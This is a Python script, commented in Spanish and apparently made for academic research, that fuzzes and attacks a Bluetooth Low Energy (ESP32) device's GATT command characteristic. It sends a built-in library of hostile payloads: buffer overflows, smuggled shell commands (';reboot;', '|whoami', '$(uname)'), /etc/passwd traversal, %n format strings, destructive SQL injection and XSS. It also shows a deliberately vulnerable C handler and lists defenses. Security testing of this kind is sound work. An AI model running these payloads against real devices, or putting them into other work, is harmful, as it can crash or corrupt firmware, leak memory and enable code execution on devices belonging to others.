#!/usr/bin/env python3
"""
BLE Malicious Payload Injection Attack - Inyección de Payloads Maliciosos

ATAQUE: Inyección de Código y Fuzzing de Parsers GATT Vulnerables
═══════════════════════════════════════════════════════════════════

DESCRIPCIÓN:
El atacante envía payloads hexadecimales crafteados diseñados para explotar
vulnerabilidades en el parser/handler del firmware del dispositivo BLE:

  - Buffer overflows: Payloads > tamaño esperado del buffer
  - Format strings: Secuencias %s, %x, %n que pueden causar leaks/crashes
  - Command injection: Caracteres especiales (;, |, &&) si se pasan a shell
  - SQL injection: Si el dispositivo registra comandos en base de datos
  - Integer overflows: Valores extremos (0xFFFFFFFF, 0x80000000)
  - Null bytes: 0x00 que pueden truncar strings en C
  - Unicode/UTF-8 malformados: Causar crashes en decodificadores

VULNERABILIDADES EXPLOTADAS:
  - VULN-06: Falta de validación de longitud de payload
  - VULN-07: Parsing inseguro de comandos (sin sanitización)
  - VULN-08: Buffer sin límite de tamaño (memcpy sin bounds checking)
  - VULN-09: Uso de funciones inseguras (strcpy, sprintf, scanf)

IMPACTO POTENCIAL:
  - Crash del firmware (DoS persistente)
  - Ejecución arbitraria de código (RCE)
  - Revelación de memoria (info leak)
  - Bypass de autenticación
  - Corrupción de configuración persistente

DIFERENCIA CON ATAQUES ANTERIORES:
  - ble_attack_p1.py: Usa comandos VÁLIDOS del protocolo legítimo
  - ble_connection_hijack.py: Explota lógica de protocolo BLE (DoS)
  - ble_payload_injection.py: Envía datos MALFORMADOS/INESPERADOS para romper el parser

CASO DE USO REAL:
Muchos dispositivos IoT tienen handlers como este (VULNERABLE):

  void handle_gatt_write(uint8_t* data, uint16_t len) {
      char buffer[16];  // Buffer fijo de 16 bytes
      memcpy(buffer, data, len);  // ❌ NO verifica len <= 16
      // Si len > 16 → buffer overflow → sobrescribe stack
  }

Este script detecta estos casos enviando payloads de diferentes tamaños y observando
si el dispositivo crashea, se comporta anómalamente o revela información.

USO:
    # Fuzzing básico: payloads de longitud creciente
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode overflow

    # Inyección de caracteres especiales (command injection)
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode special-chars

    # Format strings (leak de memoria)
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode format-string

    # Valores extremos (integer overflow)
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode integer-overflow

    # Suite completa de fuzzing
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode full --log injection.json

    # Payload personalizado en hex
    python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --custom-payload "41414141414141414141414141414141"

MONITOREO:
    # Sniffer capturando los payloads maliciosos
    # + Serial monitor del ESP32 para ver crashes/resets

DEFENSA:
    - Validación de longitud: if (len > MAX_SIZE) return ERROR;
    - Uso de funciones seguras: strncpy, snprintf, memcpy_s
    - Sanitización de entrada: eliminar caracteres especiales
    - Sandboxing: ejecutar parsers en contexto aislado
    - Fuzzing durante desarrollo (AFL, libFuzzer)

AUTOR: [Tu nombre]
FECHA: 15 de noviembre de 2025
LICENCIA: Uso exclusivo para investigación académica
"""

import asyncio
import argparse
import sys
import time
import json
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError

# UUIDs del servicio ESP32_P1
SERVICE_UUID = "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
CMD_CHAR_UUID = "beb5483e-36e1-4688-b7f5-ea07361b26a8"
NOTIFY_CHAR_UUID = "beb5483f-36e1-4688-b7f5-ea07361b26a8"

# Payloads maliciosos predefinidos
PAYLOAD_LIBRARY = {
    "overflow": [
        # Buffer overflows: payloads de longitud creciente
        ("Overflow_4B", b"\x41" * 4),
        ("Overflow_16B", b"\x41" * 16),
        ("Overflow_32B", b"\x41" * 32),
        ("Overflow_64B", b"\x41" * 64),
        ("Overflow_128B", b"\x41" * 128),
        ("Overflow_256B", b"\x41" * 256),
        ("Overflow_512B", b"\x41" * 512),
        # Patrón De Bruijn para identificar offset exacto del overflow
        ("DeBruijn_32B", b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"),
    ],
    
    "special-chars": [
        # Caracteres especiales para command injection
        ("SemicolonCmd", b"\x01\x00;reboot;\x00"),
        ("PipeCmd", b"\x01\x00|whoami\x00"),
        ("AmpersandCmd", b"\x01\x00&&ls\x00"),
        ("BacktickCmd", b"\x01\x00`id`\x00"),
        ("DollarCmd", b"\x01\x00$(uname)\x00"),
        # Path traversal
        ("PathTraversal", b"\x01/../../../etc/passwd\x00"),
        # Null byte injection (truncar strings en C)
        ("NullByteInject", b"\x01\x00\x00IGNORED_DATA"),
        # Newline injection (para logs o archivos de configuración)
        ("NewlineInject", b"\x01admin\nadmin:password\n"),
    ],
    
    "format-string": [
        # Format strings para leak de memoria o crashes
        ("FormatStr_Basic", b"%s%s%s%s%s%s%s%s"),
        ("FormatStr_Hex", b"%x%x%x%x%x%x%x%x"),
        ("FormatStr_Write", b"%n%n%n%n"),  # ⚠️ Escribe en memoria (muy peligroso)
        ("FormatStr_Long", b"%08x." * 20),
        # Mixed con comandos
        ("FormatStr_CmdMix", b"\x01%s%x%n\x00"),
    ],
    
    "integer-overflow": [
        # Valores extremos para causar integer overflow
        ("IntMax_8bit", b"\xFF\xFF\xFF\xFF"),
        ("IntMax_16bit", b"\xFF\xFF\x00\x00"),
        ("IntMax_32bit", b"\xFF\xFF\xFF\xFF"),
        ("IntMin_Signed", b"\x80\x00\x00\x00"),
        ("Negative_Max", b"\xFF\xFF\xFF\x7F"),  # -1 en complemento a 2
        # Tamaños inconsistentes (len field != actual length)
        ("LenMismatch", b"\xFF\xFF\x01\x02"),  # dice len=65535 pero envía 4 bytes
    ],
    
    "unicode-malformed": [
        # UTF-8 malformado para causar crashes en decodificadores
        ("UTF8_Overlong", b"\xC0\x80"),  # Null overlong
        ("UTF8_Invalid", b"\xFF\xFE\xFD"),
        ("UTF8_Incomplete", b"\xC2"),  # Secuencia incompleta
        ("UTF8_Surrogate", b"\xED\xA0\x80"),  # Surrogate inválido
    ],
    
    "sql-injection": [
        # SQL injection (si el dispositivo usa SQLite o similar)
        ("SQLi_Basic", b"' OR '1'='1"),
        ("SQLi_Union", b"' UNION SELECT * FROM users--"),
        ("SQLi_Drop", b"'; DROP TABLE config;--"),
        ("SQLi_Sleep", b"' OR sleep(5)--"),
    ],
    
    "xss-payloads": [
        # XSS (si el dispositivo tiene interfaz web que muestra logs)
        ("XSS_Basic", b"<script>alert(1)</script>"),
        ("XSS_ImgOnerror", b"<img src=x onerror=alert(1)>"),
        ("XSS_SVG", b"<svg/onload=alert(1)>"),
    ],
    
    "control-chars": [
        # Caracteres de control que pueden causar issues en parsers
        ("BellChar", b"\x07" * 10),  # Bell (puede causar beeps en terminal)
        ("BackspaceFlood", b"\x08" * 50),
        ("EscapeSequence", b"\x1b[H\x1b[2J"),  # Clear screen ANSI
        ("CarriageReturn", b"\r\n\r\n\r\n"),
    ],
}


class PayloadInjectionAttack:
    """
    Implementa ataques de inyección de payloads maliciosos en características GATT.
    """
    
    def __init__(self, target_address: str, mode: str, custom_payload: Optional[str] = None,
                 delay: float = 2.0, log_file: Optional[str] = None):
        self.target_address = target_address.upper()
        self.mode = mode
        self.custom_payload = custom_payload
        self.delay = delay  # Delay entre payloads (para ver efectos)
        self.log_file = log_file
        
        self.client: Optional[BleakClient] = None
        self.attack_log: List[Dict] = []
        self.payloads_sent = 0
        self.crashes_detected = 0
        self.anomalies_detected = 0
        
    def log_event(self, event_type: str, details: Dict):
        """Registra evento en log estructurado"""
        log_entry = {
            "timestamp": time.time(),
            "datetime": datetime.now().isoformat(),
            "event": event_type,
            "details": details
        }
        self.attack_log.append(log_entry)
        
        # Print en consola
        if event_type == "PAYLOAD_SENT":
            print(f"[→] {details['name']}: {details['size']} bytes → {details['preview']}")
        elif event_type == "RESPONSE_RECEIVED":
            print(f"[←] Respuesta: {details['data']}")
        elif event_type == "ANOMALY_DETECTED":
            print(f"[!] ANOMALÍA: {details['type']} - {details['description']}")
            self.anomalies_detected += 1
        elif event_type == "DEVICE_CRASH":
            print(f"[💥] CRASH DETECTADO: {details['reason']}")
            self.crashes_detected += 1
        elif event_type == "CONNECTION_LOST":
            print(f"[-] Conexión perdida (posible crash del dispositivo)")
    
    def notification_handler(self, sender: int, data: bytearray):
        """
        Captura notificaciones del dispositivo.
        Respuestas anómalas pueden indicar explotación exitosa.
        """
        hex_data = data.hex()
        ascii_repr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
        
        self.log_event("RESPONSE_RECEIVED", {
            "handle": sender,
            "data": hex_data,
            "ascii": ascii_repr,
            "size": len(data)
        })
        
        # Detectar anomalías en respuestas
        if len(data) > 100:
            self.log_event("ANOMALY_DETECTED", {
                "type": "OVERSIZED_RESPONSE",
                "description": f"Respuesta inusualmente grande: {len(data)} bytes (posible memory leak)"
            })
        
        # Buscar patrones de direcciones de memoria (leak)
        if any(data[i:i+4] == b'\x00\x00\x00\x08' for i in range(len(data)-3)):
            self.log_event("ANOMALY_DETECTED", {
                "type": "MEMORY_LEAK_SUSPECTED",
                "description": "Patrón de dirección de memoria detectado en respuesta"
            })
    
    async def connect_to_target(self) -> bool:
        """Establece conexión con el dispositivo target"""
        try:
            print(f"\n[*] Conectando a {self.target_address}...")
            self.client = BleakClient(self.target_address, timeout=15.0)
            await self.client.connect()
            
            if not self.client.is_connected:
                return False
            
            print(f"[+] Conectado exitosamente")
            
            # Suscribirse a notificaciones
            try:
                await self.client.start_notify(NOTIFY_CHAR_UUID, self.notification_handler)
                print(f"[+] Monitoreando respuestas en {NOTIFY_CHAR_UUID}")
            except Exception as e:
                print(f"[!] No se pudo suscribir a notificaciones: {e}")
            
            return True
            
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return False
    
    async def send_payload(self, name: str, payload: bytes) -> bool:
        """
        Envía un payload malicioso y monitorea la respuesta.
        Retorna False si se detecta crash del dispositivo.
        """
        if not self.client or not self.client.is_connected:
            self.log_event("CONNECTION_LOST", {"during_payload": name})
            return False
        
        try:
            # Preview del payload (primeros 32 bytes)
            preview = payload[:32].hex() + ("..." if len(payload) > 32 else "")
            
            self.log_event("PAYLOAD_SENT", {
                "name": name,
                "size": len(payload),
                "payload_hex": payload.hex(),
                "preview": preview
            })
            
            # Enviar payload
            await self.client.write_gatt_char(CMD_CHAR_UUID, payload, response=False)
            self.payloads_sent += 1
            
            # Esperar respuesta o anomalía
            await asyncio.sleep(self.delay)
            
            # Verificar si sigue conectado
            if not self.client.is_connected:
                self.log_event("DEVICE_CRASH", {
                    "payload": name,
                    "reason": "Dispositivo se desconectó inmediatamente después del payload"
                })
                return False
            
            return True
            
        except BleakError as e:
            self.log_event("SEND_ERROR", {
                "payload": name,
                "error": str(e)
            })
            return False
        except Exception as e:
            print(f"[-] Error inesperado: {e}")
            return False
    
    async def run_fuzzing_campaign(self):
        """Ejecuta campaña de fuzzing según el modo seleccionado"""
        
        if self.mode == "full":
            # Suite completa
            categories = list(PAYLOAD_LIBRARY.keys())
        elif self.mode in PAYLOAD_LIBRARY:
            # Solo una categoría específica
            categories = [self.mode]
        else:
            print(f"[-] Modo '{self.mode}' no reconocido")
            return False
        
        print(f"\n[*] Iniciando campaña de fuzzing: {', '.join(categories)}")
        print(f"[*] Total de payloads a enviar: {sum(len(PAYLOAD_LIBRARY[cat]) for cat in categories)}")
        print(f"[*] Delay entre payloads: {self.delay}s\n")
        
        for category in categories:
            print(f"\n{'='*60}")
            print(f"  CATEGORÍA: {category.upper()}")
            print(f"{'='*60}\n")
            
            payloads = PAYLOAD_LIBRARY[category]
            
            for name, payload in payloads:
                success = await self.send_payload(name, payload)
                
                if not success:
                    print(f"\n[!] Dispositivo crasheado o desconectado después de '{name}'")
                    print(f"[!] Este payload puede haber explotado una vulnerabilidad")
                    
                    # Intentar reconectar
                    print(f"[*] Intentando reconectar en 5 segundos...")
                    await asyncio.sleep(5)
                    
                    reconnected = await self.connect_to_target()
                    if not reconnected:
                        print(f"[-] No se pudo reconectar. Finalizando ataque.")
                        return False
                    
                    print(f"[+] Reconectado. Continuando con siguiente payload...")
            
            print(f"\n[✓] Categoría '{category}' completada\n")
        
        return True
    
    async def send_custom_payload(self):
        """Envía un payload personalizado en hexadecimal"""
        if not self.custom_payload:
            print("[-] No se especificó payload personalizado")
            return False
        
        try:
            payload = bytes.fromhex(self.custom_payload)
            print(f"\n[*] Enviando payload personalizado ({len(payload)} bytes):")
            print(f"    Hex: {payload.hex()}")
            print(f"    ASCII: {''.join(chr(b) if 32 <= b <= 126 else '.' for b in payload)}\n")
            
            success = await self.send_payload("CustomPayload", payload)
            
            if not success:
                print(f"\n[!] Dispositivo crasheó con el payload personalizado")
            else:
                print(f"\n[✓] Payload enviado exitosamente")
            
            return success
            
        except ValueError:
            print(f"[-] Payload inválido. Debe ser hexadecimal (ej: 414141)")
            return False
    
    def export_log(self):
        """Exporta log de ataque a JSON"""
        if not self.log_file:
            return
        
        attack_summary = {
            "attack_type": "BLE_PAYLOAD_INJECTION",
            "target_address": self.target_address,
            "mode": self.mode,
            "payloads_sent": self.payloads_sent,
            "crashes_detected": self.crashes_detected,
            "anomalies_detected": self.anomalies_detected,
            "custom_payload": self.custom_payload,
            "events": self.attack_log
        }
        
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                json.dump(attack_summary, f, indent=2, ensure_ascii=False)
            print(f"\n[+] Log exportado a: {self.log_file}")
        except Exception as e:
            print(f"[-] Error al exportar log: {e}")
    
    async def run(self):
        """Ejecuta el ataque completo"""
        print("=" * 80)
        print("  BLE MALICIOUS PAYLOAD INJECTION - Fuzzing de Parsers GATT")
        print("=" * 80)
        print(f"\n[*] Target: {self.target_address}")
        print(f"[*] Modo: {self.mode}")
        print(f"[*] Delay entre payloads: {self.delay}s")
        print(f"[*] Log: {self.log_file if self.log_file else 'No'}\n")
        
        # Conectar
        success = await self.connect_to_target()
        if not success:
            print("\n[-] ATAQUE FALLIDO: No se pudo establecer conexión")
            return False
        
        # Ejecutar fuzzing o payload custom
        if self.custom_payload:
            await self.send_custom_payload()
        else:
            await self.run_fuzzing_campaign()
        
        # Desconectar
        if self.client and self.client.is_connected:
            await self.client.disconnect()
            print(f"\n[+] Desconectado de {self.target_address}")
        
        # Reporte final
        print("\n" + "=" * 80)
        print("  REPORTE FINAL DEL ATAQUE")
        print("=" * 80)
        print(f"Payloads enviados: {self.payloads_sent}")
        print(f"Crashes detectados: {self.crashes_detected}")
        print(f"Anomalías detectadas: {self.anomalies_detected}")
        print(f"Eventos registrados: {len(self.attack_log)}")
        
        if self.crashes_detected > 0:
            print(f"\n[!] ¡VULNERABILIDAD CONFIRMADA! El dispositivo crasheó {self.crashes_detected} veces")
            print(f"[!] Revisa el log para identificar los payloads que causaron el crash")
        
        if self.anomalies_detected > 0:
            print(f"\n[!] Se detectaron {self.anomalies_detected} comportamientos anómalos")
            print(f"[!] Pueden indicar memory leaks, buffer overflows o parsing incorrecto")
        
        # Exportar log
        if self.log_file:
            self.export_log()
        
        print("=" * 80 + "\n")
        
        return True


def main():
    parser = argparse.ArgumentParser(
        description="BLE Malicious Payload Injection - Fuzzing de parsers GATT",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
MODOS DE ATAQUE:

  overflow          - Buffer overflows (payloads de 4B a 512B)
  special-chars     - Command injection (;, |, &&, `, $)
  format-string     - Format string attacks (%s, %x, %n)
  integer-overflow  - Valores extremos (0xFF, 0x80000000)
  unicode-malformed - UTF-8 malformado
  sql-injection     - SQL injection payloads
  xss-payloads      - XSS (si tiene interfaz web)
  control-chars     - Caracteres de control ASCII
  full              - Suite completa de todos los modos

EJEMPLOS:

  # Fuzzing de buffer overflow
  python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode overflow

  # Command injection
  python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode special-chars

  # Suite completa con logging
  python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode full --log injection.json

  # Payload personalizado (16 bytes de 'A')
  python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --custom-payload "41414141414141414141414141414141"

  # Con delay corto para fuzzing rápido
  python ble_payload_injection.py --address EC:E3:34:B2:E0:C2 --mode overflow --delay 0.5

DEFENSA:
  Ver comentarios en el código sobre validación de entrada y funciones seguras.
        """
    )
    
    parser.add_argument(
        '--address',
        required=True,
        help='Dirección MAC del dispositivo BLE target'
    )
    
    parser.add_argument(
        '--mode',
        choices=['overflow', 'special-chars', 'format-string', 'integer-overflow',
                 'unicode-malformed', 'sql-injection', 'xss-payloads', 'control-chars', 'full'],
        default='overflow',
        help='Modo de fuzzing (default: overflow)'
    )
    
    parser.add_argument(
        '--custom-payload',
        type=str,
        help='Payload personalizado en hexadecimal (ej: 414141 para AAA)'
    )
    
    parser.add_argument(
        '--delay',
        type=float,
        default=2.0,
        help='Delay en segundos entre payloads (default: 2.0)'
    )
    
    parser.add_argument(
        '--log',
        type=str,
        help='Archivo JSON para exportar log de ataque'
    )
    
    args = parser.parse_args()
    
    # Advertencia
    print("\n⚠️  ADVERTENCIA: ATAQUE DE FUZZING - PUEDE CAUSAR DAÑOS")
    print("Este script envía payloads diseñados para causar crashes y explotar bugs.")
    print("Solo debe usarse en dispositivos propios en entornos controlados.")
    print("Puede causar pérdida de datos o daño permanente al firmware.\n")
    
    response = input("¿Confirmas que entiendes los riesgos y tienes autorización? (yes/no): ")
    if response.lower() != 'yes':
        print("Ataque cancelado.")
        sys.exit(0)
    
    # Crear y ejecutar ataque
    attack = PayloadInjectionAttack(
        target_address=args.address,
        mode=args.mode,
        custom_payload=args.custom_payload,
        delay=args.delay,
        log_file=args.log
    )
    
    try:
        asyncio.run(attack.run())
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido por usuario")
        sys.exit(0)


if __name__ == "__main__":
    main()
